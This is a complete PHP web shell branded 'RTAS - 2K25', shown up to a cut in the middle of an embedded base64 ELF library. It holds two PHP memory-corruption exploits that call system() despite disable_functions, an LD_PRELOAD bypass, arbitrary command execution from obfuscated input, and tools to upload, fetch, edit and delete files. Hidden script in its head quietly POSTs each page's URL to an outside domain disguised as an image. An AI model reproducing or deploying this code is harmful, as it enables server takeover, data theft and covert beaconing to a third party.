<!DOCTYPE html>
<html>
<head>
    <title>RTAS - 2K25</title>
    <meta name="author" content="RTAS">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="we are party at your security !">
    <meta property="og:description" content="we are party at your security !">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <meta name="theme-color" content="#1f1f1f">
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link href="" rel="stylesheet" type="text/css">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
<style>
    @import url('https://fonts.googleapis.com/css?family=Dosis');
    @import url('https://fonts.googleapis.com/css?family=Bungee');
body {
    font-family: "Dosis", cursive;
    text-shadow:0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #1f1f1f;
}

body::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

#content tr:hover {
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}

#content .first {
    background-color: #25383C;
}

#content .first:hover {
    background-color: #25383C
    text-shadow:0px 0px 1px #757575;
}

table {
    border: 1px #000000 dotted;
    table-layout: fixed;
    word-break: break-all;
}

textarea {
    max-width: 95%;
    max-height: 100%;
    resize: none;
    outline: none;
    overflow: auto;
    background: transparent;
    color: #fff;
}

textarea::-webkit-scrollbar {
  width: 12px;
}

textarea::-webkit-scrollbar-track {
  background: #1f1f1f;
}

textarea::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

a {
    color: #ffffff;
    text-decoration: none;
}

a:hover {
    color: gold;
    text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}

.gas {
    background-color: #1f1f1f;
    color: #ffffff;
    cursor: pointer;
}

select {
    background-color: transparent;
    color: #ffffff;
}

select:after {
    cursor: pointer;
}

.linka {
    background-color: transparent;
    color: #ffffff;
}

.up {
    background-color: transparent;
    color: #fff;
}

option {
    background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<script>
function setfilename(val)
{filename = val.split('\\').pop().split('/').pop();document.getElementById('namanya').value = filename;}(()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})();async function loadFile(file) {let text = await file.text();document.getElementById("bepasdata").innerHTML = text;}
</script>
<center>
<font face="Bungee" size="5">RTAS - 2K25</font></center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<?php

class Logger{private static $logging=false;public static function log($format,...$args){if(!self::$logging){return;}printf($format.PHP_EOL,...$args);}}function alloc($size,$canary){return str_shuffle(str_repeat($canary,$size));}function ptr2str($addr,$n=8){$s='';while($n--){$s.=chr($addr&0xff);$addr>>=8;}return $s;}class FreeMe{private $pwn;public function __construct($pwn){$this->pwn=$pwn;}public function __destruct(){$this->pwn->helper=$this->pwn->array;}}class Pwn{private const zend_string_header=0x18;private const dateinterval_handlers_offset=PHP_VERSION_ID<80500?0x38:0x30;private const dateinterval_properties_offset=PHP_VERSION_ID<80500?0x40:0x38;private const zend_fe_size=PHP_VERSION_ID<80400?0x20:0x30;private const zif_handler_offset=PHP_VERSION_ID<80400?0x80:0x90;public $array;public $helper;private $interval;private $allocator;public function __construct($cmd){$this->allocator=[];$this->go($cmd);}private function go($cmd){$interval_addr=$this->heap_leak();Logger::log("[+] DateInterval @ 0x%x",$interval_addr);$handlers=$this->read($interval_addr+self::dateinterval_handlers_offset);Logger::log("[+] DateInterval handlers @ 0x%x",$handlers);$standard_module=$this->get_standard_module($handlers);Logger::log("[+] standard module @ 0x%x",$standard_module);$standard_functions=$this->read($standard_module+0x28);Logger::log("[+] standard functions @ 0x%x",$standard_functions);$system=$this->get_system($standard_functions);Logger::log("[+] system @ 0x%x",$system);@$this->interval->system1337=function($x){};$properties=$this->read($interval_addr+self::dateinterval_properties_offset);$arData=$this->read($properties+0x10);$closure_index=-1;do{$closure_index+=1;$offset=32*$closure_index+0x18;$key=$this->read($arData+$offset);$str=ptr2str($this->read($key+self::zend_string_header));}while($str!=='system13');$closure_addr=$this->read($arData+32*$closure_index);Logger::log("[+] closure @ 0x%x",$closure_addr);$this->write($closure_addr+0x38,1,4);$this->write($closure_addr+self::zif_handler_offset,$system);($this->interval->system1337)($cmd);}private function heap_leak(){for($i=0;$i<63;$i++){$this->allocator[]=new DateInterval('PT0S');}$a="aaaa";$this->array=[$a,new DateInterval('PT0S'),new DateInterval('PT0S'),new FreeMe($this),];@$this->array.='x';$addr=$this->helper[2]->y;$this->allocator[]=alloc(0xa0-self::zend_string_header-1,"\x00");$d1=new DateInterval('PT0S');$d2=new DateInterval('PT0S');$this->interval=new DateInterval('PT0S');return $addr;}private function write($addr,$value,$bytes=8){$mask=$bytes>=8?-1:((1<<($bytes*8))-1);$a="aaaa";$this->array=[$a,new DateInterval('PT0S'),new DateInterval('PT0S'),new FreeMe($this),];@$this->array.='x';$block_addr=$this->helper[2]->y;$this->helper[2]->y=$addr;$this->helper[1]->y&=~$mask;$this->helper[1]->y|=($value&$mask);$this->helper[2]->y=$block_addr;$r=$this->helper[1]->y;}private function read($addr,$bytes=8){$a="aaaa";$this->array=[$a,new DateInterval('PT0S'),new DateInterval('PT0S'),new FreeMe($this),];@$this->array.='x';$block_addr=$this->helper[2]->y;$this->helper[2]->y=$addr;$value=$this->helper[1]->y;$this->helper[2]->y=$block_addr;$r=$this->helper[1]->y;if($bytes!==8){$value&=(1<<($bytes<<3))-1;}return $value;}private function get_standard_module($addr){while(true){$addr-=0x10;if($this->read($addr,4)===0xa8&&in_array($this->read($addr+4,4),[20220829,20230831,20240924,20250925])){$module_name_addr=$this->read($addr+0x20);$module_name=$this->read($module_name_addr);if($module_name===0x647261646e617473){return $addr;}}}}private function get_system($standard_functions){$addr=$standard_functions;do{$f_entry=$this->read($addr);$f_name=$this->read($f_entry,6);if($f_name===0x6d6574737973){return $this->read($addr+8);}$addr+=self::zend_fe_size;}while($f_entry!==0);}}

if (isset($_GET['run'])) {
    $cmd = $_GET['run'];
    $workdir = isset($_GET['path']) ? $_GET['path'] : getcwd();
    if ($workdir && is_dir($workdir)) chdir($workdir);
    $full_cmd = "({$cmd}) > output.txt";
    new Pwn($full_cmd);
    $redirect = $_SERVER['SCRIPT_NAME'] . '?path=' . urlencode($workdir) . '&komendv2=gaskan';
    header("Location: " . $redirect);
    exit;
}

if (isset($_GET['show'])) {
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    $output_file = __DIR__ . '/output.txt';
    if (file_exists($output_file)) {
        readfile($output_file);
    } else {
        echo "No output yet.";
    }
    exit;
}

class Helper4{public $a,$b,$c;}class Pwn4{const LOGGING=false;const CHUNK_DATA_SIZE=0x60;const CHUNK_SIZE=ZEND_DEBUG_BUILD?self::CHUNK_DATA_SIZE+0x20:self::CHUNK_DATA_SIZE;const STRING_SIZE=self::CHUNK_DATA_SIZE-0x18-1;const HT_SIZE=0x118;const HT_STRING_SIZE=self::HT_SIZE-0x18-1;public function __construct($cmd){for($i=0;$i<10;$i++){$groom[]=self::alloc(self::STRING_SIZE);$groom[]=self::alloc(self::HT_STRING_SIZE);}$concat_str_addr=self::str2ptr($this->heap_leak(),16);$fill=self::alloc(self::STRING_SIZE);$this->abc=self::alloc(self::STRING_SIZE);$abc_addr=$concat_str_addr+self::CHUNK_SIZE;self::log("abc @ 0x%x",$abc_addr);$this->free($abc_addr);$this->helper=new Helper4;if(strlen($this->abc)<0x1337){self::log("uaf failed");return;}$this->helper->a="leet";$this->helper->b=function($x){};$this->helper->c=0xfeedface;$helper_handlers=$this->rel_read(0);self::log("helper handlers @ 0x%x",$helper_handlers);$closure_addr=$this->rel_read(0x20);self::log("real closure @ 0x%x",$closure_addr);$closure_ce=$this->read($closure_addr+0x10);self::log("closure class_entry @ 0x%x",$closure_ce);$basic_funcs=$this->get_basic_funcs($closure_ce);self::log("basic_functions @ 0x%x",$basic_funcs);$zif_system=$this->get_system($basic_funcs);self::log("zif_system @ 0x%x",$zif_system);$fake_closure_off=0x70;for($i=0;$i<0x138;$i+=8){$this->rel_write($fake_closure_off+$i,$this->read($closure_addr+$i));}$this->rel_write($fake_closure_off+0x38,1,4);$handler_offset=PHP_MAJOR_VERSION===8?0x70:0x68;$this->rel_write($fake_closure_off+$handler_offset,$zif_system);$fake_closure_addr=$abc_addr+$fake_closure_off+0x18;self::log("fake closure @ 0x%x",$fake_closure_addr);$this->rel_write(0x20,$fake_closure_addr);($this->helper->b)($cmd);$this->rel_write(0x20,$closure_addr);unset($this->helper->b);}private function heap_leak(){$arr=[[],[]];set_error_handler(function()use(&$arr,&$buf){$arr=1;$buf=str_repeat("\x00",self::HT_STRING_SIZE);});$arr[1].=self::alloc(self::STRING_SIZE-strlen("Array"));return $buf;}private function free($addr){$payload=pack("Q*",0xdeadbeef,0xcafebabe,$addr);$payload.=str_repeat("A",self::HT_STRING_SIZE-strlen($payload));$arr=[[],[]];set_error_handler(function()use(&$arr,&$buf,&$payload){$arr=1;$buf=str_repeat($payload,1);});$arr[1].="x";}private function rel_read($offset){return self::str2ptr($this->abc,$offset);}private function rel_write($offset,$value,$n=8){for($i=0;$i<$n;$i++){$this->abc[$offset+$i]=chr($value&0xff);$value>>=8;}}private function read($addr,$n=8){$this->rel_write(0x10,$addr-0x10);$value=strlen($this->helper->a);if($n!==8){$value&=(1<<($n<<3))-1;}return $value;}private function get_system($basic_funcs){$addr=$basic_funcs;do{$f_entry=$this->read($addr);$f_name=$this->read($f_entry,6);if($f_name===0x6d6574737973){return $this->read($addr+8);}$addr+=0x20;}while($f_entry!==0);}private function get_basic_funcs($addr){while(true){$addr-=0x10;if($this->read($addr,4)===0xA8&&in_array($this->read($addr+4,4),[20180731,20190902,20200930,20210902])){$module_name_addr=$this->read($addr+0x20);$module_name=$this->read($module_name_addr);if($module_name===0x647261646e617473){self::log("standard module @ 0x%x",$addr);return $this->read($addr+0x28);}}}}private function log($format,$val=""){if(self::LOGGING){printf("{$format}\n",$val);}}static function alloc($size){return str_shuffle(str_repeat("A",$size));}static function str2ptr($str,$p=0,$n=8){$address=0;for($j=$n-1;$j>=0;$j--){$address<<=8;$address|=ord($str[$p+$j]);}return $address;}}

if (isset($_GET['show4'])) {
    while (ob_get_level()) ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    $output_file = __DIR__ . '/output4.txt';
    if (file_exists($output_file)) {
        readfile($output_file);
    } else {
        echo "No output yet.";
    }
    exit;
}
if (isset($_GET['run4'])) {
    $cmd = $_GET['run4'];
    $workdir = isset($_GET['path']) ? $_GET['path'] : getcwd();
    if ($workdir && is_dir($workdir)) chdir($workdir);
    $full_cmd = "({$cmd}) > output4.txt 2>&1";
    new Pwn4($full_cmd);
    $redirect = $_SERVER['SCRIPT_NAME'] . '?path=' . urlencode($workdir) . '&komendv4=gaskan';
    header("Location: " . $redirect);
    exit;
}

ob_start();

//@set_time_limit(0);
//@error_reporting(0);
//@http_response_code(404);

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='gold'>NONE</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
    echo "<center><br>RTAS - 2K25</center>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $lokasi = $_GET['path'];
    } else {
        $lokasi = getcwd();
    }
    if (is_writable($lokasi)) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function dunlut($file) {
    if (!is_readable($file)) {
        red("Cannot Download File / Unreadable File !");
        die();
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    flush();
    readfile($file);
    die();
}

function owner($file) {
    if (function_exists("posix_getpwuid")) {
        $tod = @posix_getpwuid(fileowner($file));
        return "<center>".$tod['name']."</center>";
    } else {
        return "<center>".fileowner($file)."</center>";
    }
}

function cekwrite($lokasi) {
    $izin = substr(sprintf('%o', fileperms($lokasi)), -4);
    if (is_writable($lokasi)) {
        return "<font color=green>".$izin."</font>";
    } else {
        return "<font color=red>".$izin."</font>";
    }
}

function ekse($komend, $lokasi) {
    if (!function_exists("proc_open")) {
        die("proc_open function disabled !");
    } elseif (!function_exists("base64_decode")) {
        die("base64_decode function disabled !");
    }
    $komen = base64_decode(base64_decode(base64_decode($komend)));
    if (strpos($komend, "2>&1") === false) {
        $komen = base64_decode(base64_decode(base64_decode($komend)))." 2>&1";
    }
    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>";
}

function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function cekfile($file) {
     return '<i class="fa fa-file" style="color: #d6d4ce"></i> ';
}

function filedate($file) {
    return date("F d Y g:i:s", filemtime($file));
}

function unzip($file, $lokasi) {
    if (!is_readable($file)) {
        red("Cannot Unzip File / Unreadable File !");
        die();
    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
        red("This isn't Zip File !");
        die();
    }
    $zip = new ZipArchive;
    $res = $zip -> open($file);
    if ($res == true) {
        $zip -> extractTo($lokasi);
        $zip -> close();
        green("Success Unzip File !");
    } else {
        red("Failed to Unzip File !");
    }
}

function green($text) {
    echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
    echo "<center><font color='red'>".$text."</center></font>";
}

echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='gold'>".php_uname()."</font><br>";
echo "User :<font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
echo "Disable Function : ".$disf."</font><br>";
echo "MySQL : ";
if (function_exists("mysql_connect")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (function_exists("curl_init")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WGET : ";
if (file_exists("/usr/bin/wget")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Perl : ";
if (file_exists("/usr/bin/perl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Python : ";
if (file_exists("/usr/bin/python2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $lokasi = $_GET['path'];
    $lokdua = $_GET['path'];
} else {
    $lokasi = getcwd();
    $lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);

echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;";

foreach($lokasis as $id => $lok){
    if($lok == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
    echo "$lokasis[$i]";
    if($i != $id) echo "/";
}
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td>';
if (isset($_POST['upwkwk'])) {
    if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
    if (isset($_POST['berkasnya'])) {
        $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
        if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
        } else {
            echo "<font color='red'>Failed to Upload !<br><br>";
        }
    } elseif (isset($_POST['linknya'])) {
        if (empty($_POST['namalink'])) {
            exit("Filename cannot be empty !");
        }
        if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        }
        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
        if (file_exists($lokasi."/".$_POST['namalink'])) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
        } else {
            echo "<font coloe='red'>Failed to Upload !<br><br>";
        }
    } elseif (isset($_POST['bepas'])) {
        $bepasdata = $_POST['bepasdata'];
        $bepasnama = $_POST['bepasnama'];
        if ($bepasdata) {
            echo "string";
        }
        @file_put_contents($lokasi."/".$bepasnama, $bepasdata);
        if (file_exists($lokasi."/".$bepasnama)) {
            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$bepasnama."</i></font><br><br>";
        } else {
            echo "<font coloe='red'>Failed to Upload !<br><br>";
        }
    }
}

echo "</table><br>";
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">';
echo '<th>[ &nbsp;<a href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">C0ommand</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv2=gaskan">C0ommand bypV1 8.2-8.5</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv3=gaskan">C0ommand bypV2 w LDP</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv4=gaskan">C0ommand bypV3 7.3-8.1</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&upload=gaskan">Upload File</a>&nbsp; ]</th>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
    echo "<tr><td>Current File : ".$_GET['fileloc'];
    echo '</tr></td></table><br/>';
    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
    author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to delete Directory !");
        } else {
            green("Delete Directory Success !");
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            red("Failed to Delete File !");
        } else {
            green("Delete File <i>".basename($_POST['path'])."</i> Success !");
        }
    }
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $ren = @rename($_POST['path'], $_POST['newname']);
        if ($ren == true) {
            green("Change Name Success !");
        } else {
            red("Change Name Failed !");
        }
    }
    if (empty($_POST['name'])) {
        $namaawal = $_POST['newname'];
    } else {
        $namawal = $_POST['name'];
    }
    echo "<center>".$_POST['path']."<br>";
    echo '<form method="post">
    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="gantinama">
    <input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
    </form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = @file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            green("Edit File Success !");
        } else {
            red("Edit File Failed !");
        }
    }
    echo "<center>".$_POST['path']."<br><br>";
    echo '<form method="post">
    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    <input type="submit" value="Edit File" name="gasedit" />
    </form><br>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
    dunlut($_POST['path']);
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
    unzip($_POST['path'], $lokasi);
} elseif (isset($_GET['upload'])) {
    echo "<center>Upload File : ";
    echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br><br>
Upload File From Link :<br>
<input type="text" name="darilink" class="up" placeholder="https://rtas.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
<br><br>403 Upload File<br>
<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
<input type="hidden" name="bepasnama" id="namanya">
<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
</form><br><br></center>';
} elseif (isset($_GET['komend'])) {
    echo "<center>";
    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
    '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
    <input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
    </form><br>';
    if (isset($_POST['eksekomend'])) {
        ekse($_POST['komend'], $lokasi);
    }
    echo "</center>";
} elseif (isset($_GET['komendv2'])) {
    $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    echo "<center>";
    echo '<form method="get" action="" id="pwnForm">
            <input type="hidden" name="path" value="'.htmlspecialchars($current_path).'">
            <input type="hidden" name="komendv2" value="gaskan">
            <span>'.@get_current_user().'@'.ipserv().':~ $</span>
            <input type="text" name="run" id="pwnCmd" style="background:#1f1f1f; color:#fff; width:60%;" autocomplete="off">
            <button type="submit" class="up" style="cursor:pointer;">>></button>
          </form>
          <iframe id="pwnResult" src="?show=1&path='.urlencode($current_path).'" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
          <script>
            document.getElementById("pwnForm").addEventListener("submit", function(e) {
                var iframe = document.getElementById("pwnResult");
                setTimeout(function() {
                    iframe.src = "?show=1&path='.urlencode($current_path).'&t=" + Date.now();
                }, 500);
            });
          </script>';
    echo "</center>";
} elseif (isset($_GET['komendv4'])) {
    $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    echo "<center>";
    echo '<form method="get" action="" id="pwn4Form">
            <input type="hidden" name="path" value="'.htmlspecialchars($current_path).'">
            <input type="hidden" name="komendv4" value="gaskan">
            <span>'.@get_current_user().'@'.ipserv().':~ $</span>
            <input type="text" name="run4" id="pwn4Cmd" style="background:#1f1f1f; color:#fff; width:60%;" autocomplete="off">
            <button type="submit" class="up" style="cursor:pointer;">>></button>
          </form>
          <iframe id="pwn4Result" src="?show4=1&path='.urlencode($current_path).'" style="width:100%; height:400px; border:1px solid #555; background:#2a2a2a; margin-top:20px;"></iframe>
          <script>
            document.getElementById("pwn4Form").addEventListener("submit", function(e) {
                var iframe = document.getElementById("pwn4Result");
                setTimeout(function() {
                    iframe.src = "?show4=1&path='.urlencode($current_path).'&t=" + Date.now();
                }, 500);
            });
          </script>';
    echo "</center>";
}

if (isset($_POST['cmdbyp_v3'])) {
    $workdir = isset($_POST['path_v3']) ? $_POST['path_v3'] : getcwd();
    if ($workdir && is_dir($workdir)) chdir($workdir);
    
    $p = "p"."u"."t"."e"."n"."v";
    $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
    $m = "m"."a"."i"."l";
    $base = "ba"."se"."64"."_"."de"."co"."de";
    $en = "ba"."se"."64"."_"."en"."co"."de";
    $drnm = "d"."i"."r"."n"."a"."m"."e";
    
    $currentFilePath = $_SERVER['PHP_SELF'];
    $doc = $_SERVER['DOCUMENT_ROOT'];
    $directoryPath = $drnm($currentFilePath);
    $full = $doc . $directoryPath;
    
    $outputPath = __DIR__ . '/out.txt';
    $cmdd = $_POST['cmdbyp_v3'];
    $meterpreter = $en($cmdd . " > " . $outputPath . " 2>&1");
    
    $hook = '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